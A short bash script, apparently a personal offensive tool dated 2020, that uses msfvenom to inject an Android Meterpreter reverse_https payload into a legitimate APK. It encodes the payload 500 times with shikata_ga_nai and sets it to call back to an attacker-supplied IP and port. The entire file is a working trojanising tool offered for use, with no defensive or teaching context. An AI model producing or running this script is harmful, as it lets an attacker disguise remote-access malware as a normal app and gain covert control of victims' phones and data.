#!/bin/bash
# by Unguest // 10/07/20
if [[ "$1" == "" || "$2" == "" || "$3" == "" || "$4" == "" ]]
then

echo "Usage :" $0 "<original_apk> <injected_apk> <ip> <port>"

else

msfvenom -x $1 -p android/meterpreter/reverse_https LHOST=$3 LPORT=$4  -e x86/shikata_ga_nai -i 500 -o $2

fi
